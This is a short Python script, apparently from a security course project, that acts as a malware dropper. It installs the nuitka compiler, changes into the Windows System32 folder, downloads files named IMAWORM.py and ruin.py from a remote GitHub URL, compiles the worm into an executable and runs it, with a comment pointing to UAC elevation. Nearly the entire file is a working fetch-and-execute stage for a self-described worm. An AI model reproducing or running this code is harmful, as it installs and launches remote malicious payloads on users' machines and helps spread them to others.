import os
os.system("pip install nuitka")
os.system("python.exe -m pip install --upgrade pip")
import urllib.request, sys, nuitka, ctypes

#https://stackoverflow.com/questions/130763/request-uac-elevation-from-within-a-python-script/41930586#41930586
  
#take both files to get ready to run
#https://www.youtube.com/watch?v=ItF_MxSUsRw&ab_channel=SanjinDedic
os.chdir("/Windows/System32")
url = "https://raw.githubusercontent.com/RCDelta/CSCI409/main/IMAWORM.py"
filename = url.split('/')[-1]
urllib.request.urlretrieve(url, filename)
# url = "https://raw.githubusercontent.com/RCDelta/CSCI409/main/initial.py"
# filename = url.split('/')[-1]
# urllib.request.urlretrieve(url, filename)
    
url = "https://raw.githubusercontent.com/RCDelta/CSCI409/main/ruin.py"
filename = url.split('/')[-1]
urllib.request.urlretrieve(url, filename)

    #try to turn Worm into an exe
# os.system("python -m nuitka initial.py")
os.system("python -m nuitka IMAWORM.py")
name = os.getlogin()
os.system(".\IMAWORM.exe")
    


    
